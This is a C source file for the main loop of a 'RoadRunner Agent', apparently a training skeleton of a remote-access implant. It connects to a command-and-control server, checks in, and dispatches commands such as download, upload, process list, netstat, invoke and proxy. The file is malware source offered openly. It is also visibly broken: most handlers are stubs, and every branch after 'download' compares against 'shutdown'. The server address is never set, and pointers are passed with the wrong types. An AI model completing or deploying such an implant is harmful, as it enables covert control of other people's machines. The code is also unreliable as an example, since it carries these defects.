/**
 * roadrunner.c contains the main function of the program.
 * @file roadrunner.c
 */
// include what we need for the functionality 
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
// include our own libraries here
#include <roadrunner.h>
#include <core.h>
#include <helloworld.h>
#include <utils.h>
#include <files.h>
#include <sys.h>
#include <proxy.h>


// declare our functions, these are static so they are not exported
static bool send_response(int sock_fd, Response *rsp);
static int connect_to_server();
static bool perform_command(Command *cmd, Response **rsp);
static Command *receive_command(int sock_fd);

/**
 * The main function for the RoadRunner Agent.
 * @return an integer return code (0 = good, 1 = bad)
 */
int main() 
{
    int agent_fd = 0;
    Response *response = NULL;
    Response **cmd_rsp = &response;
    Command *next_cmd = NULL;
    bool should_run = true;

    // call our hello world function
    say_hello();

    // Agent logic
    // connect
    agent_fd = connect_to_server();

    // Send checkin
    response = checkin_command();
    send_response(agent_fd, response);

    //Free response for new commands loops
    free_response(response);
    response = NULL;

	// begin main execution loop
    while(should_run){
        //Receive_command (see Networking section below), store in next_cmd
        next_cmd = receive_command(agent_fd);

        //Validate cmd is not null
        if(next_cmd == NULL){
            printf("Recieved command was NULL");
            should_run = false;
            break;
        }
        
        //Perform given command
        should_run = perform_command(next_cmd, cmd_rsp); //**rsp_out is asking for a location of where to store the output of perform command 

        if(response == NULL){
            printf("Command response was null\n");
            should_run = false;
            break;
        }
        //based off cmd, should i continue?
        
        //Send response
        send_response(agent_fd, cmd_rsp);

		//Repeat until shutdown command is received. Which means cease operations on agent, cleanup resources, and bug out

        
        //Free memory and wrangle them pointers
        free_response(response);
        response = NULL;
        free_command(next_cmd);
        next_cmd = NULL;
    }

    return 0;
}

/******************************* AGENT CODE ***********************************/

/**
 * Perform a command sent by the server and send back a response.
 * @param cmd (in) a pointer to the command structure
 * @param rsp_out (out) a Response pointer that returns the command response
 * @return a bool indicating if the agent needs to shutdown (true = continue, false = shutdown)
 */
static bool perform_command(Command *cmd, Response **rsp_out)
{
    bool should_continue = true;

    // perform an "if else" tree checking the command against all known command strings
    // receiving a valid command should result in calling the appropriate command function
    // if the shutdown command is received, an appropriate response should be returned to 
    // the server, then the client should exit

    //Initial input validation
    if(!cmd || !*rsp_out){
        printf("No command was passed in, or there is no command response\n");
        should_continue = false;
    }
    //Validating command properties
    if (!(cmd->cmd) || (cmd->cmd_len) <= 0 || !(cmd->args) || (cmd->args_len) <= 0){    
        printf("Some command property is null or missing\n");
        should_continue = false;
    }

    //Check if command exists from known good commands (ex do I have a hostname command? Yes? then execute)

    //Shutdown
    if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
        *rsp_out = alloc_response(0, SHUTDOWN_MSG, strlen(SHUTDOWN_MSG));
        RR_DEBUG_PRINT("received: shutdown command\n")
        should_continue = false;

    }
    else if(0 == strncmp(cmd->cmd, "sleep", strlen("sleep"))){                //Sleep
        *rsp_out = sleep_command(cmd);
        RR_DEBUG_PRINT("received: sleep command\n")
        
    
    }
    else if(0 == strncmp(cmd->cmd, "download", strlen("download"))){         //Download
        RR_DEBUG_PRINT("received: download command\n")

    }
    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
        RR_DEBUG_PRINT("received: upload command\n")
    }
    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
        RR_DEBUG_PRINT("received: hostname command\n")
    }
    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
        RR_DEBUG_PRINT("received: process list command\n")
    }
    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
        RR_DEBUG_PRINT("received: netstat command\n")
    }
    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
        RR_DEBUG_PRINT("received: invoke command\n")
    }
    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
        RR_DEBUG_PRINT("received: proxy command\n")
    }
    
    
    
    
    

    else{
        printf("Not a valid command\n");
    }

    
    
    

    return should_continue;
}


/****************************** NETWORK CODE **********************************/

/**
 * Send the response to the server. 
 * @param sock_fd (in) a valid socket file descriptor
 * @param rsp (in) the response to be sent
 * @return a bool representing if the transmission had an error
 */
static bool send_response(int sock_fd, Response *rsp)
{
    // Serialize Response struct into byte stream (see commands.c in the command_io directory)
    // Send response byte stream to server
    char *serialized_response = NULL;
    uint32_t total_tx = 0;
    uint32_t bytes_tx = 0;

    uint32_t stream_size = serialize_response(rsp, &serialized_response);

    while(total_tx < stream_size){
        bytes_tx = send(sock_fd, serialized_response + total_tx, stream_size - total_tx, 0);
        if(bytes_tx == -1){
            printf("Error sending response\n");
            checkfree(serialized_response);
            return true;
        }

        total_tx += bytes_tx;
    }
    checkfree(serialized_response);
    return false;
}

/**
 * Receive a command from the C2 server.
 * @param sock_fd a valid socket file descriptor
 * @return a pointer to a Command structure
 */
static Command *receive_command(int sock_fd)
{
    Command *cmd = NULL;
    uint32_t msg_size = 0;
    uint32_t size_read = 0;
    char *read_stream = NULL;
    ssize_t read_ret_val = 0;

    // Read message size from socket
    //TODO error handling for <=0 conditions ((0)bytes read in, connection closed; error reading (-1))
    read_ret_val = read(sock_fd, &msg_size, 4);

    if(read_ret_val < 0){
        printf("Error reading in message\n");
        return NULL;
    } else if (read_ret_val == 0){
        printf("0 bytes read in or connection was closed\n");
        return NULL;
    }
    

    msg_size = ntohl(msg_size);

    //Allocate memory for read stream
    read_stream = calloc(msg_size, sizeof(char));

    //Read in the expected amount of data, then check to see if that amount was actually recieved. If it was, continue onto deserialization.
    //If not, increment the read_stream offset (size_read) & repeat the process. Print error message & return NULL if read() returns -1
    while (size_read != msg_size){
        read_ret_val = read(sock_fd, read_stream + size_read, msg_size);
        if (read_ret_val >= 0)
            size_read += read_ret_val;
        else{
            printf("Time to panic\n");
            goto CLEANUP;
       }
    }

    //Deserialize the stream received from the server and populate a Command struct
    cmd = deserialize_command(msg_size, read_stream);

    //Free memory of read_stream
    free(read_stream);
    read_stream = NULL;

CLEANUP:
    if(read_stream != NULL){
        free(read_stream);
        read_stream = NULL;
    }
    return cmd;
}


/**
 * Connect to a C2 server.
 * @return a socket file descriptor
 */
static int connect_to_server()
{
    int sock_fd = 0;
    struct sockaddr_in server;

    //Create a socket & error check
    if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        printf("Socket creation failed....\n");
        exit(0);
    }
    else
        printf("Socket successfully created...\n");

    //Set the server address
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    printf("Server address set...\n");

    //Create the connection to the server
    if (connect(sock_fd, &server, sizeof(server)) < 0){
        printf("Server connection error: %s\n", strerror(errno));
        exit(0);
    }
    else
        printf("Connection made...\n");
    return sock_fd;
}
